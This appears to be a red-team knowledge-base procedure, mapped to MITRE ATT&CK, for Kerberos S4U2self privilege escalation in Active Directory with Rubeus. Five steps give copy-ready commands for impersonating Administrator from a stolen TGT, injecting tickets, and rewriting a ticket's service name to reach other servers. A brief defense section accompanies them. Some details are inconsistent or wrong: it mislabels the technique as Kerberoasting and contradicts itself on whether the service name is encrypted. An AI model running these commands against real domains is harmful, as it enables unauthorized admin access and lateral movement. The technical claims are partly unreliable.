---
id: c0af0ec2-f3ca-46b7-a8aa-da72e8b48abe
name: Kerberos-S4U2Self-Privilege-Escalation
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:07.868347+00:00'
updated_at: '2023-04-10T20:36:07.923398+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - >-
    [[techniques/Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos
    Tickets]]
sub_techniques:
  - '[[sub-techniques/Kerberoasting|T1558.003 - Kerberoasting]]'
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Kerberos]]'
  - '[[tags/S4U2self - Privilege Escalation]]'
commands:
  - '[[commands/rubeus-s4u-self-impersonate-admin-base64]]'
  - '[[commands/rubeus-ptt-inject-base64-ticket]]'
  - '[[commands/rubeus-s4u-self-impersonate-admin-ptt-base64]]'
  - '[[commands/rubeus-s4u-generate-s4u2self-ticket]]'
  - '[[commands/rubeus-tgssub-modify-service-ptt]]'
platforms:
  - Windows
tools:
  - '[[tools/Rubeus]]'
validated: true
---

# Kerberos-S4U2Self-Privilege-Escalation

## Summary

Kerberos S4U2self Privilege Escalation is a post-exploitation technique that allows an attacker with a valid Ticket Granting Ticket (TGT) to obtain a service ticket for any user without knowing their password, enabling impersonation and privilege escalation in an Active Directory environment. This procedure uses the Rubeus tool to abuse the Kerberos Service for User (S4U) extension, specifically S4U2self, to generate impersonation tickets for high-privilege users like domain administrators or local admins on remote servers.

## Description

In Active Directory, the S4U2self extension allows a service to request a service ticket on behalf of a user to itself, which can be abused if the attacker controls a valid TGT. Starting with a compromised low-privilege account's TGT, the attacker can impersonate any other user (e.g., Administrator) to request tickets for services like CIFS on domain controllers or servers. This leads to lateral movement and privilege escalation, such as accessing restricted shares or executing commands as the impersonated user. The technique requires domain-joined Windows systems with Kerberos enabled and is commonly used after initial access via phishing or weak credentials. Success grants the attacker access to resources authorized for the impersonated user, potentially compromising the entire domain.

## Requirements

1. Valid TGT for a domain user (obtained via prior authentication or tools like Mimikatz).
2. Domain-joined Windows host with network access to the target server or Domain Controller.
3. Rubeus tool compiled for the target architecture (x64 recommended).
4. Administrative privileges on the execution host to inject tickets.
5. Knowledge of target service principal names (SPNs) like cifs/<server.domain.local>.

## Defense

- Implement the principle of least privilege to restrict service account permissions and limit S4U2self usage.
- Enable advanced auditing for Kerberos events (Event ID 4769 for ticket requests) and monitor for anomalous S4U logons.
- Use network segmentation to isolate critical servers and enforce just-in-time administration.
- Deploy tools like Microsoft ATA or BloodHound to detect delegation abuse patterns.

## Objectives

1. Obtain a service ticket for a target user (e.g., domain admin) without their password using S4U2self.
2. Impersonate the user to access authorized resources, such as file shares or remote execution.
3. Achieve privilege escalation or lateral movement within the Active Directory domain.
4. Inject the forged ticket for persistent access to the impersonated identity.

## Instructions

This procedure outlines two common variants: escalating to domain admin for machine access and using a computer account for local admin impersonation on a server. Ensure Rubeus is executed from an elevated PowerShell prompt on a compromised domain host.

### Step 1: Generate S4U2self Ticket for Domain Admin Impersonation

**Context**: Use an existing TGT to request a service ticket impersonating the domain Administrator for a target service (e.g., CIFS on a server). This step abuses S4U2self to forge the ticket without the admin's password.

**Command** ([[commands/rubeus-s4u-self-impersonate-admin-base64]]):
```powershell
Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001.domain.local" /ticket:"$_BASE64_TGT"
```

> This command requests a TGS ticket for the Administrator user to the specified altservice using the provided base64-encoded TGT. The /self flag enables S4U2self, /nowrap suppresses base64 wrapping for direct output, and /impersonateuser specifies the target identity. Expected output includes the forged TGS ticket in base64 format, confirming successful impersonation ticket generation. If the TGT is invalid or the service is unreachable, it will error with Kerberos authentication failure.

### Step 2: Inject the Impersonation Ticket

**Context**: Pass the generated TGS ticket to the current session using Pass-The-Ticket (PTT) to enable usage for subsequent actions like accessing shares.

**Command** ([[commands/rubeus-ptt-inject-base64-ticket]]):
```powershell
Rubeus.exe ptt /ticket:"$_BASE64_TGS"
```

> This injects the base64-encoded TGS ticket into the current logon session's Kerberos cache. Run this immediately after ticket generation. Expected output is a success message like "Ticket successfully imported" with details of the ticket (user, service, validity period). Verify with `klist` to see the ticket in the LSA cache; failure indicates invalid ticket format or insufficient privileges.

### Step 3: Generate and Inject S4U2self Ticket with PTT for Admin Access

**Context**: Combine impersonation and injection in one step to directly apply the ticket for immediate privilege escalation, targeting a specific server service.

**Command** ([[commands/rubeus-s4u-self-impersonate-admin-ptt-base64]]):
```powershell
Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001" /ticket:"$_BASE64_TGT" /ptt
```

> This performs the S4U2self request and immediately injects the resulting TGS via PTT. Use when direct injection is needed for quick access. Expected output shows ticket generation followed by successful import. Test access by running `dir \\srv001\C$` as the impersonated admin; success grants elevated share access.

### Step 4: Generate S4U2self Ticket Using Computer Account

**Context**: For scenarios where impersonating via a computer account (e.g., for resource-based delegation abuse), request a ticket for a local admin on a target server using the attacker's TGT.

**Command** ([[commands/rubeus-s4u-generate-s4u2self-ticket]]):
```powershell
Rubeus.exe s4u /user:"$_COMPUTER_ACCOUNT" /msdsspn:"cifs/$_COMPUTER_DNS" /impersonateuser:"$_LOCAL_ADMIN" /ticket:"$_BASE64_TGT" /nowrap
```

> Specify the computer account (/user), its SPN (/msdsspn), and target local admin (/impersonateuser). This generates an S4U ticket allowing impersonation to the computer's service. Expected output is the base64 TGS ticket; the command may show a proxy failure but prints the S4U2self ticket successfully.

### Step 5: Modify and Inject TGS Service Ticket

**Context**: After generating the ticket, modify the service name in the TGS (since it's not encrypted) to target a different server, then inject it for use.

**Command** ([[commands/rubeus-tgssub-modify-service-ptt]]):
```powershell
Rubeus.exe tgssub /ticket:"$_BASE64_TGS" /altservice:"cifs/$_SERVER_DNS" /ptt
```

> The /tgssub flag substitutes the altservice in the ticket's ciphered data, allowing redirection to any server. Expected output confirms modification and injection success. Verify by accessing the new server's resources; this enables flexible lateral movement.
